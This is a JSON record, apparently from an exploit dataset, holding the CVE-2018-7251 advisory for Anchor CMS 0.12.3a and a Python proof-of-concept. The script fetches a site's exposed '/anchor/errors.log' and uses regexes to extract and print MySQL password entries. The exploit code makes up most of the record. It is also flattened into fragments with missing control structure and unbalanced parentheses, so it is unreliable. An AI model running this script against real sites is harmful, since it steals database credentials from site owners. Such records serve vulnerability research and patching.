{
    "text": "vul_name : Anchor CMS 0.12.3a Information Disclosure ， vul_cve : CVE-2018-7251 ， vul_poc :  # Exploit Title : Information disclosure ( MySQL password ) in error log ，  # Date : 2/10/2019 ，  # Exploit Author : Tijme Gommers (  ，  # Vendor Homepage :  ，  # Software Link :  ，  # Version : 0.12.3a ，  # Tested on : Linux ，  # CVE : CVE-2018-7251 ，  # By default , AnchorCMS will log errors to the \"/anchor/errors.log\" file in the webroot of the web application. This allows malicious users to access the error log and view potentally sensitive information. Sometimes the AnchorCMS error log contains ocurrences of the MySQL error \"Can't connect to MySQL server on 'xx.xx.xx.xx' ( 111 ) \". When this error occurs the variables of the MySQL connector class are serialized into a JSON object and logged to the error log. ， plain_result = requests.get ( url=url )  ， print ( 'Usage : {0} <url>'.format ( _file_ )  ，  # Ensure we have the URL ， print_usage (  )  ， sys.exit ( 1 )  ， print ( \" * Using AnchorCMS website : \" + sys.argv [ 1 ]  )  ， print ( \" * Trying to import 'requests' module\" )  ， requests_loader = importlib.util.find_spec ( 'requests' )  ， requests_module_found = requests_loader is not None ， print ( \" * 'requests' module not found , please install it using pip\" )  ， print ( \" * pip install requests\" )  ， sys.exit ( 1 )  ， json_url = sys.argv [ 1 ] .strip ( \"/\" ) + \"/anchor/errors.log\" ， print ( \" * Trying to get errors.log file at : {}\".format ( json_url )  ， plain_result = get_plain ( json_url )  ， print ( \" * URL could not be requested , errors.log is probably not exposed\" )  ， sys.exit ( 1 )  ， print ( \" * Found data {} , trying to parse it now\".format ( plain_result )  ， lines = re.findall ( r'\"line\" : \\d' , plain_result.text )  ， print ( \" * Found {} error entries\".format ( len ( lines )  ， passwords = re.findall ( r'\\ [  (  [ ^\\ [ \\ ]  *  ) \"password\" (  [ ^\\ [ \\ ]  *  ) \\ ] ' , plain_result.text )  ， print ( \" * Found {} passwords entries\".format ( len ( passwords )  ， print ( \"+ {}\".format ( password ) ",
    "time": "2019.10.03"
}